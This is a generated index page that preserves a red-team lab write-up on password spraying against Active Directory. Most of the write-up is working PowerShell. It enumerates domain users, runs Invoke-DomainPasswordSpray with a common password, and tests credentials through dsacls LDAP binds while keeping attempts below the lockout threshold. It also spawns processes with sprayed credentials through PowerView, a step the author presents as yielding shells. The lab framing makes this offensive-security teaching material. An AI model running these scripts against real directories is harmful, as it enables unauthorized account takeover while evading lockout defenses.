---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Active Directory Password Spraying

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-experiments-active-directory-kerberos-abuse-active-directory-password-spraying` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory Password Spraying](../../topics/offensive-security-experiments/active-directory-password-spraying.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-experiments-active-directory-kerberos-abuse-active-directory-password-spraying |
| name | Active Directory Password Spraying |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Screenshot from 2019-03-20 00-10-10.png
- Screenshot from 2019-03-20 21-29-13.png
- Screenshot from 2019-03-20 21-32-37.png
- spraying.gif
_body: "# Active Directory Password Spraying\n\nThis lab explores ways of password spraying against Active Directory accounts.\n\
  \n## Invoke-DomainSpray\n\n{% code title=\"attacker@victim\" %}\n```csharp\nGet-ADUser -Properties name -Filter * | Select-Object\
  \ -ExpandProperty name |  Out-File users.txt\ntype users.txt\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-03-20 21-29-13.png>)\n\n{% code title=\"attacker@victim\" %}\n```csharp\nInvoke-DomainPasswordSpray -UserList\
  \ .\\users.txt -Password 123456 -Verbose\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from 2019-03-20 21-32-37.png>)\n\
  \n## Spraying using dsacls\n\nWhile I was poking around with dsacls for enumerating AD object permissions\n\n{% content-ref\
  \ url=\"using-dsacls-to-check-ad-object-permissions.md\" %}\n[using-dsacls-to-check-ad-object-permissions.md](using-dsacls-to-check-ad-object-permissions.md)\n\
  {% endcontent-ref %}\n\nI noticed that one could attempt to bind to LDAP using specific AD credentials, so a dirty AD password\
  \ spraying POC came about:\n\n{% code title=\"attacker@victim\" %}\n```csharp\n$domain = ((cmd /c set u)[-3] -split \"=\"\
  )[-1]\n$pdc = ((nltest.exe /dcname:$domain) -split \"\\\\\\\\\")[1]\n$lockoutBadPwdCount = ((net accounts /domain)[7] -split\
  \ \":\" -replace \" \",\"\")[1]\n$password = \"123456\"\n\n# (Get-Content users.txt)\n\"krbtgt\",\"spotless\" | % {\n  \
  \  $badPwdCount = Get-ADObject -SearchBase \"cn=$_,cn=users,dc=$domain,dc=local\" -Filter * -Properties badpwdcount -Server\
  \ $pdc | Select-Object -ExpandProperty badpwdcount\n    if ($badPwdCount -lt $lockoutBadPwdCount - 3) {\n        $isInvalid\
  \ = dsacls.exe \"cn=domain admins,cn=users,dc=offense,dc=local\" /user:$_@offense.local /passwd:$password | select-string\
  \ -pattern \"Invalid Credentials\"\n        if ($isInvalid -match \"Invalid\") {\n            Write-Host \"[-] Invalid Credentials\
  \ for $_ : $password\" -foreground red\n        } else {\n            Write-Host \"[+] Working Credentials for $_ : $password\"\
  \ -foreground green\n        }        \n    }\n}\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from 2019-03-20\
  \ 00-10-10.png>)\n\n## Spraying with Start-Process\n\nSimilarly to dsacls, it's possible to spray passwords with `Start-Process`\
  \ cmdlet and the help of PowerView's cmdlets:\n\n{% code title=\"spray-ldap.ps1\" %}\n```csharp\n# will spray only users\
  \ that currently have 0 bad password attempts\n# dependency - powerview\n\nfunction Get-BadPasswordCount {\n    param(\n\
  \        $username = \"username\",\n        $domain = \"offense.local\"\n    )\n    $pdc = (get-netdomain -domain $domain).PdcRoleOwner\n\
  \    $badPwdCount = (Get-NetUser $username -Domain $domain -DomainController $pdc.name).badpwdcount\n    return $badPwdCount\n\
  }\n\n$users = Get-netuser -properties samaccountname | Select-Object -ExpandProperty samaccountname\n$domain = \"offense.local\"\
  \n$password = \"123456\"\n\nWrite-Host $users.Count users supplied; $users | % {\n    $badPasswordCount = Get-BadPasswordCount\
  \ -username $_ -Domain $domain\n    if ($badPasswordCount -lt 0) {\n        Write-Host Spraying : -NoNewline; Write-host\
  \ -ForegroundColor Green \" $_\"\n        $credentials = New-Object System.Management.Automation.PSCredential -ArgumentList\
  \ @(\"$domain\\$_\",(ConvertTo-SecureString -String $password -AsPlainText -Force))\n        Start-Process cmd -Credential\
  \ ($credentials)\n    } else {\n        Write-Host \"Ignoring $_ with $badPasswordCount badPwdCount\" -ForegroundColor Red\n\
  \    }\n}\n```\n{% endcode %}\n\nEnjoy the shells:\n\n![](../../.gitbook/assets/spraying.gif)\n\n## References\n\n{% embed\
  \ url=\"https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1\" %}\n\n{% embed url=\"https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon\"\
  \ %}"
_relative_path: offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying.md
````
